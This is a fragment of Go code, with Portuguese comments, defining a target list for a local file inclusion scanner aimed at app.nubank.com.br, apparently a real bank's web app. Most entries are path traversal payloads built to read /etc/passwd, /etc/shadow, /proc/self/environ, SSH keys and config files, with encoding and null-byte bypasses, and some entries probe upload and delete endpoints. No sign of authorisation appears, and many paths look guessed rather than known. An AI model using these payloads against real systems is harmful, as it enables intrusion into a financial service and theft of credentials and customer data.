var alvosBase = []Alvo{
	// Endpoints gerais com parâmetros comuns de LFI
	{"https://app.nubank.com.br/beta/index.php?page=", "GET"},
	{"https://app.nubank.com.br/beta/index.php?file=", "GET"},
	{"https://app.nubank.com.br/beta/download.php?file=", "GET"},
	{"https://app.nubank.com.br/beta/view.php?doc=", "GET"},
	{"https://app.nubank.com.br/beta/template.php?path=", "GET"},

	// Subdiretórios comuns e uploads
	{"https://app.nubank.com.br/beta/uploads/file=", "GET"},
	{"https://app.nubank.com.br/beta/admin/config.php?file=", "GET"},
	{"https://app.nubank.com.br/beta/assets/data.php?file=", "GET"},
	{"https://app.nubank.com.br/beta/include/template.php?path=", "GET"},

	// Diretórios sensíveis típicos para LFI
	{"https://app.nubank.com.br/beta/var/www/html/index.php?file=", "GET"},
	{"https://app.nubank.com.br/beta/etc/passwd?file=", "GET"},
	{"https://app.nubank.com.br/beta/home/user/config.php?path=", "GET"},
	{"https://app.nubank.com.br/beta/root/.ssh/id_rsa?file=", "GET"},

	// Novos alvos com bypasses (path traversal, null byte, etc.)
	{"https://app.nubank.com.br/beta/painel.php?page=../../../../../etc/passwd", "GET"},
	{"https://app.nubank.com.br/beta/painel.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd", "GET"},
	{"https://app.nubank.com.br/beta/painel.php?page=../../../../../etc/passwd%00", "GET"},
	{"https://app.nubank.com.br/beta/index.php?file=../../../../../etc/shadow%00", "GET"},
	{"https://app.nubank.com.br/beta/viewer.php?file=../../../../../var/log/auth.log", "GET"},
	{"https://app.nubank.com.br/beta/viewer.php?file=../../../../../var/log/auth.log%00", "GET"},
	{"https://app.nubank.com.br/beta/admin.php?include=../../../../../../proc/self/environ", "GET"},
	{"https://app.nubank.com.br/beta/admin.php?include=../../../../../../proc/self/environ%00", "GET"},
	{"https://app.nubank.com.br/beta/dashboard.php?path=....//....//etc/passwd", "GET"},
	{"https://app.nubank.com.br/beta/dashboard.php?path=..%5C..%5Cetc%5Cpasswd", "GET"},
	{"https://app.nubank.com.br/beta/admin/config.php?config=../../../etc/passwd", "GET"},
	{"https://app.nubank.com.br/beta/settings.php?file=../../../../../etc/passwd", "GET"},
	{"https://app.nubank.com.br/beta/settings.php?file=../../../../../etc/passwd%00", "GET"},
	{"https://app.nubank.com.br/beta/download.php?file=../../../../../../var/log/apache2/access.log", "GET"},
	{"https://app.nubank.com.br/beta/download.php?file=../../../../../../var/log/apache2/access.log%00", "GET"},
	{"https://app.nubank.com.br/beta/wp-content/plugins/vulnerable-plugin/include.php?file=../../../../../../wp-config.php", "GET"},
	{"https://app.nubank.com.br/beta/index.php?option=com_webtv&controller=../../../../../../etc/passwd%00", "GET"},
	{"https://app.nubank.com.br/beta/index.php?option=com_config&view=../../../../../../configuration.php", "GET"},
	{"https://app.nubank.com.br/beta/index.php?file=../../../../../home/admin/.ssh/authorized_keys", "GET"},
	{"https://app.nubank.com.br/beta/portal.php?page=../../../../../../etc/issue", "GET"},
	{"https://app.nubank.com.br/beta/portal.php?page=../../../../../../etc/hostname", "GET"},
	{"https://app.nubank.com.br/beta/portal.php?page=../../../../../../var/www/html/index.php", "GET"},

	// Tentativas de outros métodos HTTP
	{"https://app.nubank.com.br/beta/api/upload.php", "POST"},
	{"https://app.nubank.com.br/beta/api/delete.php", "DELETE"},
	{"https://app.nubank.com.br/beta/api/update.php?file=", "PUT"},

	// Outras extensões e arquivos
	{"https://app.nubank.com.br/beta/index.jsp?file=", "GET"},
	{"https://app.nubank.com.br/beta/include/config.pl?path=", "GET"},
	{"https://app.nubank.com.br/beta/admin/config.asp?file=", "GET"},
}